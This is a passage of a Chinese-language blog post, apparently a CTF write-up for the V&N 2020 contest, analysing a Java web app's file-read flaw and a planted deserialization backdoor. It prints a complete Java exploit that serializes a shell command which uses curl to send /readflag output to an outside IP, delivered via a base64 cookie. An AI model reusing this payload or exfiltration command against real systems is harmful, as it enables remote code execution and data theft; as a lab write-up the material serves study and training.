<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PictureController</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>({<span class="hljs-string">"/showpic.form"</span>})</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">index</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (file == <span class="hljs-keyword">null</span>)</span><br><span class="line">      file = <span class="hljs-string">"showpic.jsp"</span>; </span><br><span class="line">    String[] attribute = file.split(<span class="hljs-string">"\\."</span>);</span><br><span class="line">    String suffix = attribute[attribute.length - <span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (!suffix.equals(<span class="hljs-string">"jsp"</span>)) {</span><br><span class="line">      <span class="hljs-keyword">boolean</span> isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(<span class="hljs-string">"cinfo"</span>)).getName().equals(<span class="hljs-string">"admin"</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> (!isadmin && (!suffix.equals(<span class="hljs-string">"jpg"</span>) || !suffix.equals(<span class="hljs-string">"gif"</span>))) {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"onlypic"</span>;</span><br><span class="line">      }</span><br><span class="line">      show(httpServletRequest, httpServletResponse, file);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"showpic"</span>;</span><br><span class="line">    } </span><br><span class="line">    </span><br><span class="line">    StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i < attribute.length - <span class="hljs-number">1</span>; i++) {</span><br><span class="line">      stringBuilder.append(attribute[i]);</span><br><span class="line">    }</span><br><span class="line">    String jspFile = stringBuilder.toString();</span><br><span class="line">    <span class="hljs-keyword">int</span> unixSep = jspFile.lastIndexOf(<span class="hljs-string">'/'</span>);</span><br><span class="line">    <span class="hljs-keyword">int</span> winSep = jspFile.lastIndexOf(<span class="hljs-string">'\\'</span>);</span><br><span class="line">    <span class="hljs-keyword">int</span> pos = (winSep > unixSep) ? winSep : unixSep;</span><br><span class="line">    jspFile = (pos != -<span class="hljs-number">1</span>) ? jspFile.substring(pos + <span class="hljs-number">1</span>) : jspFile;</span><br><span class="line">    <span class="hljs-keyword">if</span> (jspFile.equals(<span class="hljs-string">""</span>)) {</span><br><span class="line">      jspFile = <span class="hljs-string">"showpic"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> jspFile;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以看到主要分两部分, 一部分是后缀名为<code>jsp</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i < attribute.length - <span class="hljs-number">1</span>; i++) {</span><br><span class="line">  stringBuilder.append(attribute[i]);</span><br><span class="line">}</span><br><span class="line">String jspFile = stringBuilder.toString();</span><br><span class="line"><span class="hljs-keyword">int</span> unixSep = jspFile.lastIndexOf(<span class="hljs-string">'/'</span>);</span><br><span class="line"><span class="hljs-keyword">int</span> winSep = jspFile.lastIndexOf(<span class="hljs-string">'\\'</span>);</span><br><span class="line"><span class="hljs-keyword">int</span> pos = (winSep > unixSep) ? winSep : unixSep;</span><br><span class="line">jspFile = (pos != -<span class="hljs-number">1</span>) ? jspFile.substring(pos + <span class="hljs-number">1</span>) : jspFile;</span><br><span class="line"><span class="hljs-keyword">if</span> (jspFile.equals(<span class="hljs-string">""</span>)) {</span><br><span class="line">  jspFile = <span class="hljs-string">"showpic"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">return</span> jspFile;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>搜了搜是来自一个挺官方的库, 没啥方法可以用, 这个<code>jspFile</code>后面会经过</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229174231.png" alt></p>
<p>就会变成</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/*.jsp</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>很遗憾这个文件夹我们是没有能力上传的, 并且前面还有一个</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] attribute = file.split(<span class="hljs-string">"\\."</span>);</span><br><span class="line">    String suffix = attribute[attribute.length - <span class="hljs-number">1</span>];</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>去掉所有的<code>.</code>, 也不能目录穿越, 而如果后缀不是<code>jsp</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String[] attribute = file.split(<span class="hljs-string">"\\."</span>);</span><br><span class="line">String suffix = attribute[attribute.length - <span class="hljs-number">1</span>];</span><br><span class="line"><span class="hljs-keyword">if</span> (!suffix.equals(<span class="hljs-string">"jsp"</span>)) {</span><br><span class="line">    show(httpServletRequest, httpServletResponse, file);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"showpic"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>show方法如下</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">    httpServletResponse.setContentType(<span class="hljs-string">"image/jpeg"</span>);</span><br><span class="line">    </span><br><span class="line">    InputStream in = httpServletRequest.getServletContext().getResourceAsStream(<span class="hljs-string">"/WEB-INF/resource/"</span> + filename);</span><br><span class="line">    <span class="hljs-keyword">if</span> (in == <span class="hljs-keyword">null</span>) {</span><br><span class="line">      in = <span class="hljs-keyword">new</span> FileInputStream(filename);</span><br><span class="line">    }</span><br><span class="line">    ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream();</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];</span><br><span class="line">    <span class="hljs-keyword">while</span> (in.read(b) != -<span class="hljs-number">1</span>) {</span><br><span class="line">      servletOutputStream.write(b);</span><br><span class="line">    }</span><br><span class="line">    in.close();</span><br><span class="line">    servletOutputStream.flush();</span><br><span class="line">    servletOutputStream.close();</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>首先第一个获取的地方</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream in = httpServletRequest.getServletContext().getResourceAsStream(<span class="hljs-string">"/WEB-INF/resource/"</span> + filename);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这个函数当参数是<code>/</code>开始, 就不能穿越到更高的目录, 也就是最多在<code>/WEB-INF/</code>同级, 包含不到<code>/tmp</code>目录, 能用的只有下面的任意文件读了</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in = <span class="hljs-keyword">new</span> FileInputStream(filename);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>但是这题是需要RCE的, 有个<code>/readflag</code></p>
<p>这个题做了一天, 都没有进展, 尝试了很多后缀名, 但是都无法解析</p>
<p>AK这辈子都不可能AK的</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>临近结束的时候看到了洞hhh</p>
<p>在Tools类的这里</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301004955.png" alt></p>
<p>其实就是个后门, 但是一直没注意到(x, 要利用这个函数的话, 我们需要反序列化一个<code>Tools</code>类</p>
<p>然后问题就来了, 打到比赛结束一直没成功, 和<strong>@杨大树</strong>以及<strong>@P3rh4ps</strong>两位师傅交流了一下, 可以通过重写writeObject方法来实现</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005525.png" alt></p>
<p>或者这里也可以直接写</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005552.png" alt></p>
<p>道理都是一样的, 都是通过构造一个<code>String[]</code>对象来传给<code>ProcessBuilder</code>进行执行, 执行的部分则是将需要空格分隔的地方, 分隔成不同的字符串, 例如</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c "curl http://ip:port/`/readflag`"</span><br><span class="line">{"/bin/sh", "-c", "curl http://ip:port/`/readflag`"}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>完整的exp如下</p>
<p></p><figure class="highlight java hljs"><figcaption><span>Tools.java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="hljs-keyword">return</span> ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">private</span> String[] testcall={<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"curl http://174.0.218.211:2333/`/readflag`"</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception {</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="hljs-keyword">return</span> bos.toByteArray();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="hljs-keyword">new</span> ProcessBuilder((String[]) obj)).start();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        String[] cmd = {<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"curl http://174.0.218.211:2333/`/readflag`"</span>};</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>生成的部分</p>
<p></p><figure class="highlight java hljs"><figcaption><span>exp.java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="hljs-keyword">import</span> com.tools.*;</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">		<span class="hljs-keyword">try</span> {</span><br><span class="line">            Tools cinfo = <span class="hljs-keyword">new</span> Tools();</span><br><span class="line">            <span class="hljs-keyword">byte</span>[] bytes = Tools.create(cinfo);</span><br><span class="line">            String payload = encoder.encodeToString(bytes);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>重新下发了一个环境, 将生成的部分放到cookie, 就可以接受flag了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005934.png" alt></p>
<p>或者将输出写到<code>/tmp/</code>下, 然后通过任意文件读拿flag也可</p>
<p>再次感谢两位师傅的帮助和赵师傅的题目</p>
<p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/">https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
</blockquote><p></p>
</body></html>
        
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
        
        <span class="column is-narrow"><a class="tag is-light article-tag"
                href="/tags/Writeup/"><i class="far fa-bookmark"></i>&nbsp;&nbsp;Writeup</a></span>
        
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2020/03/04/CSRF%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/">CSRF学习之旅</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2020/02/25/Minos%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9%E6%8C%87%E5%8D%97/">Minos主题修改指南</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">评论</h3>
    
<script>
    function loadDisqus(){
    var disqus_config = function () {
        this.page.url = 'https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/';
        this.page.identifier = '2020/02/29/V-N公开赛2020-writeup/';
        
        this.language = 'zh';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.async = true;
        s.src = '//' + 'cjm00n' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
}
    // 通过检查 window 对象确认是否在浏览器中运行
var runningOnBrowser = typeof window !== "undefined";
// 通过检查 scroll 事件 API 和 User-Agent 来匹配爬虫
var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
// 检查当前浏览器是否支持 IntersectionObserver API
var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;

// 一个小 hack，将耗时任务包裹在 setTimeout(() => { }, 1) 中，可以推迟到 Event Loop 的任务队列中、等待主调用栈清空后才执行，在绝大部分浏览器中都有效
// 其实这个 hack 本来是用于优化骨架屏显示的。一些浏览器总是等 JavaScript 执行完了才开始页面渲染，导致骨架屏起不到降低 FCP 的优化效果，所以通过 hack 将耗时函数放到骨架屏渲染完成后再进行。
setTimeout(function () {
  if (!isBot && supportsIntersectionObserver) {
    // 当前环境不是爬虫、并且浏览器兼容 IntersectionObserver API
    var disqus_observer = new IntersectionObserver(function(entries) {
      // 当前视窗中已出现 Disqus 评论框所在位置
      if (entries[0].isIntersecting) {
        // 加载 Disqus
        loadDisqus();
        // 停止当前的 Observer
        disqus_observer.disconnect();
      }
    }, { threshold: [0] });
    // 设置让 Observer 观察 #disqus_thread 元素
    disqus_observer.observe(document.getElementById('disqus_thread'));
  } else {
    // 当前环境是爬虫、或当前浏览器其不兼容 IntersectionObserver API
    // 直接加载 Disqus
    loadDisqus();
  }
}, 1);
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                <i class="fas fa-copyright" ></i> 2020 cjM00N&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank"><i class="fab fa-github-alt" style="color:black"></i>&nbsp;Hexo</a>&nbsp;&&nbsp;<a
                href="https://github.com/ppoffice/hexo-theme-minos"><i class="fas fa-blog" style="color: black;"></i>&nbsp;Minos</a>
                        
            </div>
            <div class="column is-hidden-mobile"></div>
            
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    // moment.locale("zh-CN");
    moment.locale("zh-CN");
</script>


    
    
    
    
    
    
    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="站内搜索" />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: '文章',
                PAGES: '页面',
                CATEGORIES: '分类',
                TAGS: '标签',
                UNTITLED: '(无标题)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>